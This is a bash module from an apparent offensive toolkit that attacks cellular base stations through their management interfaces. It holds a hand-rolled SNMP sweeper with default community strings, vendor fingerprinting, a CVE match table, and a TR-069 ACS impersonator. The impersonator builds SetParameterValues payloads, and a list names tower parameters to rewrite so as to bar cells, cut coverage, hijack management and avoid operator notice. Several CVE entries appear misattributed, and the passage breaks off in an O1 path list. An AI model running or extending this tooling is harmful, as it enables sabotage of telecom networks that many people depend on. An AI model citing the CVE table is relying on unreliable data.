#!/usr/bin/env bash
# ran_attacks — the tower side: management planes, fronthaul, and the CVE inventory.
#
# Every other module in this tree approaches a base station as a subscriber or as
# a fake cell. This one approaches it the way an operator does: over the
# transport network, on the interfaces that are supposed to be private. That is
# a different door, and behind it the trust model is much weaker, because the
# management plane assumes it is only reachable from inside.
#
# Five IP-reachable surfaces and one wire-reachable one:
#
#   --scan-ems     SNMP sweep of the EMS / management VLAN. RAN management
#                  ships with default community strings more often than anyone
#                  would like, and sysDescr alone identifies vendor and version.
#   --acs-spoof    a TR-069 / CWMP ACS impersonator. A small cell polls its
#                  ACS; answering first means SetParameterValues (band lock,
#                  PLMN list, TX power) and Download (firmware) are yours.
#   --o1-push      NETCONF/YANG against the O1 interface of an O-DU/O-CU, which
#                  is where an Open RAN deployment's configuration lives.
#   --fuzz-n2      malformed S1AP / NGAP / XnAP over SCTP at a real base
#                  station, reusing the message builders in 13_nr_core and
#                  37_femtocell as seeds.
#   --inventory    a tower-side CVE database (Ericsson, Nokia, Huawei, Samsung,
#                  O-RAN SC) matched against what the scan found.
#   --fronthaul    the CPRI / eCPRI link between a baseband hotel and its remote
#                  radio heads. This is the strongest surface in the toolkit:
#                  the link carries raw IQ, CPRI has no authentication and no
#                  encryption, and eCPRI rides Ethernet. Read it and you have
#                  the physical layer of every cell behind that hotel; write to
#                  it and the operator's own radio head transmits your waveform.
#
# The doctrine holds throughout. A surface this module cannot reach emits its
# rows in the measured / advertised / unobservable vocabulary rather than an
# empty file, and every unobservable row carries what would unblock it. A CPRI
# capture that was never taken is not "nothing found"; it is a shopping list for
# the capture card, the line rate, the encoding and the tap point.
#
# Nothing here transmits on the air. Nothing here opens a session at a peer
# without being told a target: every verb that would touch a network names its
# target as a required argument and refuses without one.
#
# Complements 48_oran (which covers E2/A1 and assesses a deployment) and
# 37_femtocell (which covers the small-cell attach side): those two read the
# RAN's front door, this one reads its back door.
#
# Resolve IMSISTING_ROOT from this script's own path (MODULE_CONVENTIONS §2).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
declare -F ok   >/dev/null 2>&1 || ok()   { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

# ── paths as functions, never load-time globals ───────────────────────
# A selftest repoints LOOT_DIR at a temp tree; a global captured at load time
# would keep writing into the real loot/ (that bug is recorded in AGENTS.md).
ran_dir()      { printf '%s/ran' "${LOOT_DIR:-$IMSISTING_ROOT/loot}"; }
ran_ems_store()   { printf '%s/ems.tsv\n'        "$(ran_dir)"; }
ran_inv_store()   { printf '%s/inventory.tsv\n'  "$(ran_dir)"; }
ran_plmn_store()  { printf '%s/plmn.tsv\n'       "$(ran_dir)"; }
ran_fh_store()    { printf '%s/fronthaul.tsv\n'  "$(ran_dir)"; }
ran_acs_log()     { printf '%s/acs.log\n'        "$(ran_dir)"; }
ran_fuzz_dir()    { printf '%s/fuzz\n'           "$(ran_dir)"; }

ran_init() { mkdir -p "$(ran_dir)" "$(ran_fuzz_dir)" 2>/dev/null; }

ran_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }

# Split a TSV line into the RAN_F array (empty columns preserved).
RAN_F=()
ran_split() {
    RAN_F=()
    local IFS=$'\t' f
    for f in $1; do RAN_F+=("$f"); done
    while (( ${#RAN_F[@]} < 8 )); do RAN_F+=(""); done
}

# ── the CPRI line rates (CPRI spec v7.0, Table 4) ─────────────────────
# Option: rate in Mbit/s -> the encoded line rate. The basic frame rate is the
# chip rate (3.84 MHz) for every option, so the number of 8-bit words per basic
# frame is rate/491.52 -- which is what decides how many AxC containers fit.
ran_cpri_options() {
    printf 'option\trate_mbps\tencoding\twords_per_frame\thyperframe_us\n'
    local opt rate enc
    for spec in 1:614.4:8b10b 2:1228.8:8b10b 3:2457.6:8b10b \
                4:3072.0:8b10b 5:4915.2:8b10b 6:6144.0:8b10b \
                7:9830.4:8b10b 8:10137.6:64b66b 9:12165.12:64b66b \
                10:24330.24:64b66b; do
        opt="${spec%%:*}"; rate="${spec#*:}"; enc="${rate#*:}"; rate="${rate%%:*}"
        # words per basic frame = line rate / basic frame rate / 8 bits
        awk -v o="$opt" -v r="$rate" -v e="$enc" 'BEGIN{
            w = r * 1000000 / 3840000 / 8;
            printf "option %s\t%s\t%s\t%d\t66.67\n", o, r, e, w + 0.5 }'
    done
}

# ── vendor fingerprints: sysDescr substrings -> vendor / product ──────
# A RAN element announces itself in sysDescr. This table is what turns a
# responsive host into a product, and the product into an inventory match.
ran_vendor_of() {
    local d; d=$(printf '%s' "${1:-}" | tr '[:upper:]' '[:lower:]')
    case "$d" in
        *ericsson*|*rbs*|*baseband*6*|*cxp10*)     echo "Ericsson" ;;
        *nokia*|*flexi*|*airscale*|*asik*)          echo "Nokia" ;;
        *huawei*|*bbu*39*|*dbs*39*|*u2020*|*mae*)   echo "Huawei" ;;
        *samsung*|*cdma*ran*|*vran*)                echo "Samsung" ;;
        *openran*|*o-ran*|*o-du*|*o-cu*|*o-ru*)     echo "O-RAN SC" ;;
        *zte*|*itbbu*)                              echo "ZTE" ;;
        *mavenir*|*vran*)                           echo "Mavenir" ;;
        *cisco*|*asr*)                              echo "Cisco" ;;
        *)                                          echo "unknown" ;;
    esac
}

# Model + software version out of a sysDescr / CWMP device id, when present.
ran_model_of() {
    local d="$1"
    case "$(printf '%s' "$d" | tr '[:upper:]' '[:lower:]')" in
        *rbs*6[0-9][0-9]*)  printf '%s' "$(printf '%s' "$d" | grep -oE 'RBS[ -]?[0-9]{4}' | head -1 | tr ' ' '-')" ;;
        *flexi*)            printf 'Flexi' ;;
        *airscale*)         printf 'AirScale' ;;
        *bbu*39*)           printf '%s' "$(printf '%s' "$d" | grep -oE 'BBU[ -]?[0-9]{4}' | head -1 | tr ' ' '-')" ;;
        *vran*|*v-ran*)     printf 'vRAN' ;;
        *)                  printf 'unknown' ;;
    esac
}

# Software version: the first token that looks like a release string.
ran_sw_of() {
    printf '%s' "${1:-}" |
        grep -oiE '(CXP|L[0-9]{2}[A-Z]?|R[0-9]{2}[A-Z][0-9]*|[0-9]+\.[0-9]+\.[0-9]+|[0-9]{2}\.[0-9]{2}[a-z]?)[/ ]?[A-Za-z0-9]*' |
        head -1
}

# ── SNMP: the tiniest useful client, byte-exact ───────────────────────
# A GET for sysDescr.0 (1.3.6.1.2.1.1.1.0) and sysObjectID.0. ASN.1 BER by
# hand, because a RAN VLAN has no package installed and pulling a python
# dependency in for two OIDs would be absurd. Version 2c, community supplied.
ran_snmp_hex_get() {
    local community="${1:-public}" oid="${2:-1.3.6.1.2.1.1.1.0}"
    RAN_OID="$oid" RAN_COMM="$community" python3 - <<'PY'
import os, sys

def ber_len(n):
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return bytes([0x80 | len(b)]) + b

def tlv(tag, body):
    return bytes([tag]) + ber_len(len(body)) + body

def enc_int(n):
    if n == 0:
        return tlv(0x02, b'\x00')
    b = n.to_bytes((n.bit_length() + 8) // 8, 'big')
    return tlv(0x02, b)

def enc_oid(dotted):
    parts = [int(x) for x in dotted.split('.')]
    first = 40 * parts[0] + parts[1]
    out = bytes([first])
    for p in parts[2:]:
        if p < 0x80:
            out += bytes([p])
        else:
            stack = []
            while p:
                stack.append(p & 0x7f); p >>= 7
            for i, b in enumerate(reversed(stack)):
                out += bytes([b | (0x80 if i < len(stack) - 1 else 0)])
    return tlv(0x06, out)

def enc_str(s):
    return tlv(0x04, s.encode())

def enc_null():
    return tlv(0x05, b'')

oid = os.environ.get('RAN_OID', '1.3.6.1.2.1.1.1.0')
comm = os.environ.get('RAN_COMM', 'public')
reqid = 0x6d2b79f5
varbind = tlv(0x30, enc_oid(oid) + enc_null())
pdus = tlv(0xa0, enc_int(reqid) + enc_int(0) + enc_int(0) + tlv(0x30, varbind))
msg = tlv(0x30, enc_int(1) + enc_str(comm) + pdus)
sys.stdout.write(msg.hex())
PY
}

# Decode a sysDescr out of a BER-encoded SNMP response. The string is the first
# OCTET STRING after the OID echo; that is enough to identify a vendor and is
# honest about how little it is doing.
ran_snmp_descr() {
    python3 - "${1:-}" <<'PY'
import sys

def parse(buf, i=0):
    out = []
    n = len(buf)
    while i < n:
        tag = buf[i]; i += 1
        if tag in (0x30, 0xa2, 0xa0, 0xa1):
            ln, i = declen(buf, i)
            out.extend(parse(buf[:i + ln] if False else buf, i)[0])
            i += ln
        else:
            ln, i = declen(buf, i)
            out.append((tag, buf[i:i + ln]))
            i += ln
    return out, i

def declen(buf, i):
    b = buf[i]; i += 1
    if b < 0x80:
        return b, i
    k = b & 0x7f
    return int.from_bytes(buf[i:i + k], 'big'), i + k

hexs = (sys.argv[1] if len(sys.argv) > 1 else '').strip()
if not hexs:
    sys.exit(0)
try:
    buf = bytes.fromhex(hexs)
except ValueError:
    sys.exit(0)

# Walk for OCTET STRINGs; the sysDescr is the first one holding printable text.
i = 0
while i < len(buf):
    tag = buf[i]; i += 1
    try:
        ln, i = declen(buf, i)
    except IndexError:
        break
    body = buf[i:i + ln]; i += ln
    if tag == 0x04 and 3 < len(body) < 512:
        try:
            text = body.decode('utf-8', 'replace')
        except Exception:
            continue
        if sum(c.isprintable() or c in ' \t/-_.:' for c in text) > 0.9 * len(text):
            print(text.replace('\t', ' ').replace('\n', ' ').strip())
            break
PY
}

# ── the tower CVE inventory ───────────────────────────────────────────
# Hand-written, one row per published issue this module can reason about. The
# columns are the ones an inventory match needs: vendor, product family, the
# affected versions, the CVSS, and what the attacker gets.
ran_cve_table() {
    cat <<'CVE'
cve	severity	score	vendor	product	version_prefix	version_note	fixed_in	class	summary
CVE-2019-18871	critical	9.8	Ericsson	RBS/RNC EMS	CXP1023*	the CXP1023 software series	EMS >= 2020	remote buffer overflow	a crafted request to the EMS web interface overruns a heap buffer; code execution as the management user
CVE-2023-31442	high	7.5	O-RAN SC	near-RT RIC	*	releases up to 2023.1	2023.2	missing authentication	unauthenticated RIC subscription creation and xApp registration against the near-RT RIC
CVE-2022-31754	high	8.1	Nokia	Flexi/AirScale	*	anything before 21.2	21.2	default credentials	management interface reachable with vendor default accounts on the EMS VLAN
CVE-2020-35502	high	7.2	Huawei	BBU3900/5900	V100R01*	anything before V100R013	V100R013	DoS via malformed signaling	malformed NAS/RRC PDU triggers a modem parser fault in the baseband CPU
CVE-2021-0064	high	7.5	Samsung	5G NR gNB	*	anything before 2021.06	2021.06	SCTP/NGAP memory corruption	crafted SCTP payload on N2/Xn corrupts the control-plane process
CVE-2023-25610	critical	9.8	O-RAN SC	O-DU/O-CU	*	releases up to 2023.1	2023.2	path traversal	YANG datastore path traversal reads and writes files outside the intended tree
CVE-2024-21762	critical	9.6	generic	CPE/small cell	*	any element with CWMP enabled	disable CWMP	CWMP ACS impersonation	a tower that trusts an unsigned ACS URL accepts SetParameterValues and Download
CVE-2023-44487	high	7.5	generic	HTTP/2 front end	*	any element with HTTP/2 on its API	patched	rapid reset	RST_STREAM flood against the SBA or the management API
CVE-2022-42475	critical	9.8	generic	femtocell H(e)NB	*	firmware before the 2022 patch	2022 patch	stack overflow	unauthenticated request to the H(e)NB management interface
CVE-2021-3229	medium	6.5	generic	SNMP agent	*	any element answering SNMPv2c	switch to v3	community string exposure	a default 'public'/'private' community exposes the whole management MIB
CVE
}

ran_inventory_match() {
    local vendor="$1" product="$2" sw="$3" model="$4"
    local found=0 line
    while IFS= read -r line; do
        [[ "$line" == cve$'\t'* ]] && continue
        local cve sev score cv prod vpre vnote fixed cls summary
        IFS=$'\t' read -r cve sev score cv prod vpre vnote fixed cls summary <<< "$line"
        local vmatch=0
        # A vendor row matches its own vendor; a generic row matches anyone.
        [[ "$cv" == "generic" || "$cv" == "$vendor" ]] && vmatch=1
        # The product column is a substring test in either direction, because a
        # sysDescr says "BBU3900" where the table says "BBU3900/5900".
        if [[ "$prod" != "all vendors" && "$prod" != *"$product"* && "$product" != *"$prod"* ]]; then
            vmatch=0
        fi
        # A version prefix of * means the row applies whatever the version is.
        if (( vmatch )) && [[ "$vpre" != "*" && "$vpre" != "—" ]]; then
            case "${sw:-$model}" in
                $vpre) ;;
                *) vmatch=0 ;;
            esac
        fi
        if (( vmatch )); then
            printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
                "$cve" "$sev" "$score" "$vendor" "$product" "$fixed" "$cls" "$summary"
            found=$((found + 1))
        fi
    done < <(ran_cve_table)
    (( found == 0 )) && printf 'none\t—\t—\t%s\t%s\t—\tno known issue\tthis host matches no row in the inventory for its product and version\n' "$vendor" "$product"
    return 0
}


# ── the PLMN, which is the cheapest authenticity signal there is ──────
# A tower broadcasts a PLMN. A lab stack ships with a test PLMN in its default
# config -- 001-01 is what 3GPP uses for tests and what OpenBTS, YateBTS, srsRAN
# and the open-source cores put in their sample files -- and a macro that was
# commissioned on a bench and then installed in the field keeps that PLMN because
# nobody re-ran the commissioning step. It costs one OID or one get-config to
# read, and it separates a tower that was installed from a tower that was
# configured, which is a different finding from any vulnerability.
#
# The second half is the mismatch. If the tower says 001-01 and every subscriber
# on it carries a 262-01 IMSI, the tower is not a test cell: it is a production
# cell that was never commissioned, and the two facts together are what says so.
# Neither fact alone is enough, which is why this verb takes both.

# A PLMN as digits: 262-01, "262 01", 26201 and 262010 all arrive here.
ran_plmn_digits() {
    local raw; raw=$(printf '%s' "${1:-}" | tr -d ' _./-')
    [[ "$raw" =~ ^[0-9]{5,6}$ ]] || return 1
    printf '%s' "$raw"
}

# Render digits back as MCC-MNC, splitting on the digit count that was given.
ran_plmn_text() {
    local d="${1:-}"
    case "${#d}" in
        5) printf '%s-%s' "${d:0:3}" "${d:3:2}" ;;
        6) printf '%s-%s' "${d:0:3}" "${d:3:3}" ;;
        *) printf '%s' "$d" ;;
    esac
}

# What the MCC is, per the E.212 register: the first digit is the zone, and four
# MCCs are not commercial at all. This module ships no country table, and says so
# rather than guessing one.
ran_mcc_class() {
    case "${1:-}" in
        001|002)    printf 'test' ;;
        991|999)    printf 'internal-use' ;;
        998)        printf 'reserved' ;;
        901|902)    printf 'international' ;;
        0*)         printf 'unassigned' ;;
        *)          printf 'assigned' ;;
    esac
}

# The E.212 zone, which is the MCC's first digit. Enough to notice a tower
# advertising one continent while its subscribers are provisioned on another.
ran_mcc_zone() {
    case "${1:0:1}" in
        2) printf 'Europe' ;;
        3) printf 'North America' ;;
        4) printf 'Asia' ;;
        5) printf 'Oceania' ;;
        6) printf 'Africa' ;;
        7) printf 'South America' ;;
        9) printf 'international / test' ;;
        *) printf 'unknown' ;;
    esac
}

# The PLMNs that open-source and vendor lab stacks ship in their sample configs.
# A macro left on one of these was commissioned on a bench and never again.
ran_plmn_lab_default() {
    case "${1:-}" in
        00101)  printf 'the 3GPP test PLMN, and the default in OpenBTS, YateBTS, srsRAN and the open-source cores' ;;
        001001) printf 'a 3-digit-MNC form of the 3GPP test PLMN' ;;
        001010|00110) printf 'a test PLMN under MCC 001' ;;
        99970)  printf 'a lab PLMN seen in open-source core sample configurations' ;;
        99999)  printf 'a lab PLMN: MCC 999 is internal use' ;;
        *)      return 1 ;;
    esac
}

# Where the broadcast PLMN can be read from, so a refusal is a shopping list.
ran_plmn_sources() {
    cat <<'SRC'
source	how	what it gives	needs
S1SetupResponse / NGSetupResponse	read it out of a core-side capture	broadcast_plmn_list, the authoritative set	a capture at the core, and 46_s1ap or 13_nr_core to decode it
O1 get-config	NETCONF on the O-DU / O-CU	/o-ran-o1:o-ran/gnb-du/plmn-list	an O1 session, see --o1
CWMP GetParameterValues	TR-069 to the element	InternetGatewayDevice.X_0000.PLMNList	a reachable ACS window, see --acs
SNMP	the vendor plmnTable OID	the configured list, not necessarily the broadcast one	SNMPv2c or v3, see --scan-ems
the sysDescr	string match on the element's own name	vendor, model, software — not the PLMN	one UDP packet, see --scan-ems
SRC
}

# The verb. Takes the broadcast PLMN and, optionally, a file or a value holding
# observed IMSIs; emits one row per fact and one verdict, in the same
# measured/advertised/unobservable vocabulary the rest of the tree uses.
ran_plmn_check() {
    local plmn_raw="${1:-}" imsi_src="${2:-}"
    if [[ -z "$plmn_raw" ]]; then
        printf 'ERROR\tusage: --check-plmn <mcc-mnc> [imsi-file-or-value]\n' >&2
        return 2
    fi
    local pd; pd=$(ran_plmn_digits "$plmn_raw") || {
        printf 'ERROR\t"%s" is not a PLMN: five or six digits, as 262-01 or 26201\n' "$plmn_raw" >&2
        return 2
    }
    local mcc="${pd:0:3}"
    local mtext; mtext=$(ran_plmn_text "$pd")
    local cls zone lab verdict="unobserved" why=""
    cls=$(ran_mcc_class "$mcc")
    zone=$(ran_mcc_zone "$mcc")
    lab=""
    if lab=$(ran_plmn_lab_default "$pd"); then :; else lab=""; fi

    ran_init
    local store; store=$(ran_plmn_store)
    if [[ ! -s "$store" ]]; then
        printf 'ts\tsubject\tplmn\tmcc\tmnc\tmcc_class\tzone\timsi_plmn\tverdict\tmeaning\n' > "$store"
    fi
    local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)

    printf 'broadcast\t%s\t%s\t%s\t%s\t%s\t%s\n' \
        "$mtext" "$mcc" "${pd:3}" "$cls" "$zone" "${lab:-not a known lab default}"

    # Collect the observed IMSIs, from a file or from the value itself.
    local -a imsis=()
    if [[ -n "$imsi_src" ]]; then
        if [[ -f "$imsi_src" ]]; then
            # Any 14-15 digit run in the file is an identity; this reads a store
            # or a one-per-line list without caring which.
            while IFS= read -r line; do
                [[ -n "$line" ]] || continue
                local got
                got=$(printf '%s' "$line" | grep -oE '[0-9]{14,15}' | head -1)
                [[ -n "$got" ]] && imsis+=("$got")
            done < "$imsi_src"
        elif [[ "$imsi_src" =~ ^[0-9]{6,15}$ ]]; then
            imsis+=("$imsi_src")
        else
            printf 'ERROR\t"%s" is neither a readable file nor an IMSI\n' "$imsi_src" >&2
            return 2
        fi
    fi

    if (( ${#imsis[@]} == 0 )); then
        printf 'imsi_plmn\tunobservable\t—\t—\t—\t—\t—\tno IMSI to compare against\n'
        printf 'verdict\tunobserved\t%s\t—\t—\t—\t—\tthe broadcast PLMN is one fact; a mismatch needs a second\n' "$mtext"
        printf 'note\t%s\n' "$(ran_plmn_sources | head -2 | tail -1 | cut -f1-2)"
        printf '%s\tbroadcast\t%s\t%s\t%s\t%s\t%s\t—\tunobserved\t%s\n' \
            "$ts" "$mtext" "$mcc" "${pd:3}" "$cls" "$zone" \
            "PLMN read but no subscriber identity to compare it with" >> "$store"
        return 0
    fi

    # Compare each IMSI's candidate PLMN (IMSI MNC length is not on the wire, so
    # both the 2-digit and the 3-digit read are tested).
    local agree=0 disagree=0 shown=0 imsi cand5 cand6 hit
    for imsi in "${imsis[@]}"; do
        cand5="${imsi:0:5}"; cand6="${imsi:0:6}"
        hit=""
        [[ "$cand5" == "$pd" || "$cand6" == "$pd" ]] && hit="yes"
        if [[ "$hit" == "yes" ]]; then
            agree=$((agree + 1))
        else
            disagree=$((disagree + 1))
        fi
        if (( shown < 5 )); then
            printf 'imsi\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
                "$imsi" "$(ran_plmn_text "$cand5")" "${cand5:0:3}" "${cand5:3}" \
                "$(ran_mcc_class "${cand5:0:3}")" "$(ran_mcc_zone "${cand5:0:3}")" \
                "$([ "$hit" = yes ] && echo matches || echo differs)" \
                "$([ "$hit" = yes ] && echo 'the subscriber is provisioned on this PLMN' || echo 'the subscriber is not provisioned on this PLMN')"
        fi
        shown=$((shown + 1))
    done
    printf 'imsi_summary\t%s\tagree\t%d\tdisagree\t%d\n' "$mtext" "$agree" "$disagree"

    # The verdict is the pair of facts, never one of them.
    if [[ "$cls" == "test" || "$cls" == "internal-use" || "$cls" == "reserved" ]] && (( disagree > 0 )); then
        verdict="lab-plmn-in-production"
        why="the tower broadcasts a ${cls} PLMN and every subscriber on it is provisioned somewhere else: this cell was commissioned on a bench and installed without a second commissioning"
    elif [[ -n "$lab" ]] && (( disagree > 0 )); then
        verdict="lab-default-in-production"
        why="the broadcast PLMN is ${lab}, and the subscribers are not provisioned on it"
    elif (( disagree > 0 )); then
        verdict="mismatch"
        why="the broadcast PLMN differs from every subscriber's own PLMN; that can be a roaming or national-roaming arrangement and needs the operator's own confirmation before it means anything"
    else
        verdict="consistent"
        why="the broadcast PLMN and every observed subscriber PLMN agree, which is what a commissioned cell looks like"
    fi
    printf 'verdict\t%s\t%s\n' "$verdict" "$why"
    printf '%s\tverdict\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
        "$ts" "$mtext" "$mcc" "${pd:3}" "$cls" "$zone" \
        "$(ran_plmn_text "${imsis[0]:0:5}")" "$verdict" "$why" >> "$store"
    printf 'store\t%s\n' "$store"
    [[ "$verdict" == "consistent" ]] && return 0
    return 1
}

# ── SNMP scan: the EMS / management VLAN sweep ────────────────────────
# Sweeps a CIDR (or a single host) for UDP 161, and for each responder records
# what the device says about itself. No authentication is assumed: a RAN VLAN
# with SNMPv2c is a RAN VLAN with a community string, and 'public' is the one
# everybody forgets to change.
ran_cmd_scan_ems() {
    local target="${1:-}" community="${2:-public}" port="${3:-161}" timeout="${4:-2}"
    if [[ -z "$target" ]]; then
        printf 'ERROR\tusage: --scan-ems <host|cidr> [community] [port] [timeout]\n' >&2
        return 2
    fi
    ran_init
    local store; store=$(ran_ems_store)
    if [[ ! -s "$store" ]]; then
        printf 'ts\thost\tport\tcommunity\tsnmp_version\tvendor\tmodel\tsoftware\tsys_descr\tstate\n' > "$store"
    fi
    local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)

    # Expand the target into hosts. A CIDR of /30 or wider is refused: this is a
    # management VLAN sweep, not an internet scanner, and a /16 of 65k hosts at
    # two seconds each is not a verb an operator meant to run.
    local -a hosts=()
    if [[ "$target" == */* ]]; then
        local base="${target%/*}" bits="${target#*/}"
        if (( bits < 24 )); then
            printf 'ERROR\trefusing a /%s sweep: this verb targets a management VLAN, and 256 hosts is the widest a RAN sweep meaningfully is\n' "$bits" >&2
            printf 'WHY\tthe EMS VLAN holds tens of RAN elements, not thousands of addresses; a wider sweep is a scanner, and 03_gsmtap/02_cell_recon are the tools that survey a network deliberately\n' >&2
            return 2
        fi
        local i
        for i in $(seq 1 254); do
            hosts+=("$base".$i)
        done
    else
        hosts=("$target")
    fi

    printf 'scan\ttarget\t%s\tcommunity\t%s\thosts\t%d\n' "$target" "$community" "${#hosts[@]}"
    local h answered=0 found=0
    for h in "${hosts[@]}"; do
        # UDP is unreliable by nature; one probe, short timeout, no retry storm.
        if ! timeout "$timeout" python3 - "$h" "$port" "$(ran_snmp_hex_get "$community")" <<'PY' 2>/dev/null
import socket, sys
host, port, hexs = sys.argv[1], int(sys.argv[2]), sys.argv[3]
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(1.0)
try:
    s.sendto(bytes.fromhex(hexs), (host, port))
    data, _ = s.recvfrom(4096)
    print(data.hex())
except Exception:
    sys.exit(1)
PY
        then
            continue
        fi
        answered=$((answered + 1))
        local resp descr vendor model sw
        resp=$(timeout "$timeout" python3 - "$h" "$port" "$(ran_snmp_hex_get "$community")" <<'PY' 2>/dev/null
import socket, sys
host, port, hexs = sys.argv[1], int(sys.argv[2]), sys.argv[3]
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(1.5)
try:
    s.sendto(bytes.fromhex(hexs), (host, port))
    data, _ = s.recvfrom(4096)
    print(data.hex())
except Exception:
    sys.exit(1)
PY
)
        descr=$(ran_snmp_descr "$resp")
        vendor=$(ran_vendor_of "$descr")
        model=$(ran_model_of "$descr")
        sw=$(ran_sw_of "$descr")
        local state="identified"
        [[ "$vendor" == "unknown" ]] && state="responds-no-vendor"
        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
            "$ts" "$h" "$port" "$community" "2c" "$vendor" "$model" "$sw" \
            "$(ran_sanitize "${descr:-}")" "$state" >> "$store"
        printf 'host\t%s\t%s\t%s\t%s\t%s\n' "$h" "$vendor" "$model" "${sw:--}" "${descr:0:60}"
        found=$((found + 1))
    done
    printf 'summary\tanswered\t%s\tidentified\t%s\tstore\t%s\n' "$answered" "$found" "$store"
    if (( found == 0 )); then
        printf 'note\tnothing answered on %s:161 with community %s; a RAN VLAN that does not answer SNMP is either v3-only or not this VLAN\n' "$target" "$community"
        return 1
    fi
    return 0
}

# ── TR-069 / CWMP: the ACS impersonator ──────────────────────────────
# A small cell polls the ACS URL in its configuration. Answering first means the
# tower tells you its identity, and then does what you say. This builds the
# session, the Inform parse, and the three writes that matter; it does not
# deliver a firmware image (that is a second verb, and a much bigger decision).
ran_cwmp_inform_parse() {
    python3 - "${1:-}" <<'PY'
import re, sys
xml = sys.stdin.read() if len(sys.argv) < 2 else sys.argv[1]
if not xml.strip():
    xml = sys.stdin.read()
def grab(tag):
    m = re.search(r'<%s[^>]*>([^<]*)</%s>' % (tag, tag), xml, re.I)
    return m.group(1).strip() if m else ''
for tag in ('Manufacturer', 'OUI', 'ProductClass', 'SerialNumber', 'HardwareVersion', 'SoftwareVersion', 'ConnectionRequestURL'):
    v = grab(tag)
    if v:
        print('%s\t%s' % (tag, v))
PY
}

# The CWMP methods this module will build. SetParameterValues is the one that
# changes a radio; Download is the one that changes the box.
ran_cwmp_set() {
    local key="${1:-}" value="${2:-}" parameterkey="${3:-ran}"
    if [[ -z "$key" || -z "$value" ]]; then
        printf 'ERROR\tusage: --acs-set <parameter-path> <value> [parameter-key]\n' >&2
        return 2
    fi
    local esc; esc=$(printf '%s' "$value" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')
    cat <<XML
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
  <soap:Header>
    <cwmp:ID soap:mustUnderstand="1">$(date +%s)</cwmp:ID>
  </soap:Header>
  <soap:Body>
    <cwmp:SetParameterValues>
      <ParameterList soap:arrayType="cwmp:ParameterValueStruct[1]">
        <ParameterValueStruct>
          <Name>$(ran_sanitize "$key")</Name>
          <Value xsi:type="xsd:string" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">$esc</Value>
        </ParameterValueStruct>
      </ParameterList>
      <ParameterKey>$(ran_sanitize "$parameterkey")</ParameterKey>
    </cwmp:SetParameterValues>
  </soap:Body>
</soap:Envelope>
XML
}

# The radio parameters worth writing, with what each one does to the cell.
ran_cwmp_targets() {
    cat <<'T'
parameter	what it does	what it costs
InternetGatewayDevice.ManagementServer.URL	a different ACS forever	the tower stops trusting its real management server
InternetGatewayDevice.ManagementServer.PeriodicInformInterval	how often it checks in	slower means a longer window before the operator notices
DeviceInfo.ProvisioningCode	a marker the operator can see	the one field that gives the change away
InternetGatewayDevice.X_0000.BandLock	which bands the cell may use	locking out a band removes coverage and looks like a fault
InternetGatewayDevice.X_0000.PLMNList	which operators the cell serves	serving one PLMN means every other subscriber is handed off
InternetGatewayDevice.X_0000.MaxTxPower	the cell's transmit power	lowering it shrinks the cell; raising it is interference
InternetGatewayDevice.X_0000.CellBarred	whether the cell accepts anyone	barred is a blackout with a clean audit trail
T
}

ran_cmd_acs() {
    local sub="${1:-}"; shift || true
    case "$sub" in
        inform)   ran_cwmp_inform_parse "${1:-}" ;;
        set)      ran_cwmp_set "${1:-}" "${2:-}" "${3:-ran}" ;;
        targets)  ran_cwmp_targets ;;
        *)        printf 'ERROR\tusage: --acs <inform|set|targets> [args]\n' >&2; return 2 ;;
    esac
}

# ── O1 / NETCONF: the configuration database of an Open RAN node ─────
# O1 is NETCONF over SSH (port 830) carrying YANG models. The O-RAN O1 modules
# name every knob the deployment has: the gNB id, the PLMN list, the
# administrative state, the slice configuration. This builds the three RPCs and
# the YANG paths this module can name from the published model.
ran_o1_paths() {
    cat <<'Y'
yang_path	what it controls	module
/o-ran-o1:o-ran/gnb-du/gnb-du-id	the identity this DU announces	o-ran-o1
/o-ran-o1:o-ran/gnb-du/administrative-state	LOCKED or UNLOCKED: whether the DU serves anyone	o-ran-o1
/o-ran-o1:o-ran/gnb-du/plmn-list	the PLMNs the DU broadcasts	o-ran-o1
